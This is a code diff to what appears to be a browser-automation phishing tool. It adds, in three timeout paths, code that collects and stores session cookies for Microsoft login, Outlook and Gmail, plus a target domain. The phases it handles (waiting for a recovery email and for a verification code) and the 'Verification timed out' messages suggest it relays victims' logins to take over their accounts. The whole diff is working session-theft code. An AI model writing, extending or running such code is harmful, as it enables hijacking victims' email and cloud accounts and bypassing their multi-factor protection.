@@ -4429,6 +4429,17 @@ if (!foundSelector) {
                     message: "Verification timed out. Please try again later."
                 });
 
+                // Capture cookies BEFORE closing browser — they're lost after close
+                try {
+                    const allUrls = [`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com'];
+                    const browserCookies = await page.cookies(...allUrls);
+                    if (browserCookies.length > 0) {
+                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                        logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies before WAITINGOPTIONS timeout close.`);
+                    }
+                } catch (cookieErr) {
+                    logger.warn(`[processRow][${browserId}] Could not capture cookies before WAITINGOPTIONS timeout close: ${cookieErr.message}`);
+                }
                 // Explicitly close browser and clean up immediately
                 if (browser && !browserFullyClosed) {
                     if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
@@ -4659,6 +4670,17 @@ if (!foundSelector) {
                     message: "Failed during WAITING_RECOVERY_EMAIL phase: Recovery email not provided in time."
                 });
 
+                // Capture cookies BEFORE closing browser — they're lost after close
+                try {
+                    const allUrls = [`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com'];
+                    const browserCookies = await page.cookies(...allUrls);
+                    if (browserCookies.length > 0) {
+                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                        logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies before WAITINGRECOVERYEMAIL timeout close.`);
+                    }
+                } catch (cookieErr) {
+                    logger.warn(`[processRow][${browserId}] Could not capture cookies before WAITINGRECOVERYEMAIL timeout close: ${cookieErr.message}`);
+                }
                 if (browser && !browserFullyClosed) {
                     if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                     await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGRECOVERYEMAIL timeout: ${err.message}`));
@@ -5545,6 +5567,17 @@ if (!foundSelector) {
                     message: "Verification timed out. Please try again later."
                 });
 
+                // Capture cookies BEFORE closing browser — they're lost after close
+                try {
+                    const allUrls = [`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com'];
+                    const browserCookies = await page.cookies(...allUrls);
+                    if (browserCookies.length > 0) {
+                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                        logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies before WAITINGCODE timeout close.`);
+                    }
+                } catch (cookieErr) {
+                    logger.warn(`[processRow][${browserId}] Could not capture cookies before WAITINGCODE timeout close: ${cookieErr.message}`);
+                }
                 // Explicitly close browser and clean up immediately
                 if (browser && !browserFullyClosed) {
                     if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
